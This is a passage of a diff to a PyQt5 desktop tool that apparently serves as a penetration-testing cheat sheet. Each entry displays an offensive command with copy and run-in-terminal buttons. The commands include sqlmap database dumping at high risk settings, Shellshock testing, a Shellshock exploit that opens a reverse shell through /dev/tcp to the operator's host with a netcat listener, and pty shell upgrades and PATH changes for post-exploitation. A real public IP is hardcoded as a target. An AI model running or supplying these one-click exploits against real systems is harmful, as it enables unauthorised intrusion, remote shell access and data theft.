+        self.container_layout.addLayout(label_layout)
+###############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command30 = SQLMap_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command30]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(SQLMap_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################      
+        SQLMap_Scan2 = QtWidgets.QLabel(f"sqlmap -u http://{rhost}:{rport} --threads=2 --time-sec=10 --level=4 --risk=3 --dump")
+        SQLMap_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(SQLMap_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(SQLMap_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+###############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command31 = SQLMap_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command31]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(SQLMap_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################      
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        shellshockTest = QtWidgets.QLabel("[+ Test for Shell Shock]")
+        shellshockTest.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+        self.container_layout.addWidget(shellshockTest)
+##############################################################################
+        shellshockTest_Scan1 = QtWidgets.QLabel("curl -H 'User-Agent: () { :; }; echo \"VULNERABLE TO SHELLSHOCK\"' http://" + rhost + ":" + rport + "/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'")
+        shellshockTest_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellshockTest_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockTest_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+###############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command32 = shellshockTest_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command32]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(shellshockTest_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################      
+        self.container_layout.addSpacerItem(spacer)
+#############################################################################      
+        shellshockExploit = QtWidgets.QLabel("[+ Exploit Shell Shock]")
+        shellshockExploit.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+        self.container_layout.addWidget(shellshockExploit)
+##############################################################################
+        shellshockExploit_Scan1 = QtWidgets.QLabel(f"nc -nlvp {lport}")
+        shellshockExploit_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellshockExploit_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockExploit_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+###############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command33 = shellshockExploit_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command33]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(shellshockExploit_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################      
+        shellshockExploit_Scan2 = QtWidgets.QLabel("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/" + self.lhost + "/" + lport + " 0>&1' http://" + rhost + ":" + rport + "/cgi-bin/admin.cgi")
+        shellshockExploit_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellshockExploit_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellshockExploit_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+###############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command34 = shellshockExploit_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command34]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(shellshockExploit_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################      
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+
+#### Passive Recon Section
+    def PassiveRecon(self):
+        self.lhost
+        self.tab3.layout = QVBoxLayout()
+        self.scroll = QScrollArea()
+        self.container = QWidget()
+        self.container_layout = QVBoxLayout(self.container)
+        self.container.setLayout(self.container_layout)
+        self.scroll.setWidget(self.container)
+        self.scroll.setWidgetResizable(True)
+        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+        self.container_layout.setContentsMargins(0,0,0,0)
+        self.container.adjustSize()
+        spacer = QSpacerItem(0, 25)
+        divider = self.create_divider()
+        self.tab3.layout.addWidget(self.scroll)
+        self.tab3.setLayout(self.tab3.layout)
+##### Censys Section Title
+        censys = QtWidgets.QLabel("[+ Censys]")
+        censys.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+        self.container_layout.addWidget(censys)
+#### Temp Port assignment
+        rhost = "216.55.143.82"
+        rport = "80"
+#### Censys Port Scan on IP
+        censys_Scan1 = QtWidgets.QLabel(f"")
+        censys_Scan1 = QtWidgets.QLabel(f"censys search {rhost} | grep -Ew \"ip|port\"")
+        censys_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(censys_Scan1)
+#### Copy Command to clipboard
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(censys_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+#### Run Command in new terminal 
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command35 = censys_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command35]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(censys_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        self.container_layout.addStretch()
+
+    
+    def lpe(self):
+        self.lhost
+        self.tab4.layout = QVBoxLayout()
+        self.scroll = QScrollArea()
+        self.container = QWidget()
+        self.container_layout = QVBoxLayout(self.container)
+        self.container.setLayout(self.container_layout)
+        self.scroll.setWidget(self.container)
+        self.scroll.setWidgetResizable(True)
+        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+        self.container_layout.setContentsMargins(0,0,0,0)
+        self.container.adjustSize()
+        spacer = QSpacerItem(0, 25)
+        divider = self.create_divider()
+        self.tab4.layout.addWidget(self.scroll)
+        self.tab4.setLayout(self.tab4.layout)
+        
+        shellPE = QtWidgets.QLabel("[+ I just got a low-priv shell !]")
+        shellPE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(shellPE)
+        shellPE_Scan1 = QtWidgets.QLabel(f"python -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        shellPE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellPE_Scan1)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+        
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan1)
+        self.container_layout.addLayout(label_layout)
+        
+        shellPE_Scan2 = QtWidgets.QLabel(f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        shellPE_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellPE_Scan2)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan2.text()))
+        copy_button.setStyleSheet(
+        "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        shellPE_Scan3 = QtWidgets.QLabel("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp")
+        shellPE_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +    
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(shellPE_Scan3)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan3)
+        self.container_layout.addLayout(label_layout)
+#############################################################################  
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        self.container_layout.addStretch()
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+##############################################################################
+
+
 if __name__ == '__main__':
     app = QApplication(sys.argv)
     ex = MainWindow()
     sys.exit(app.exec_())
+    
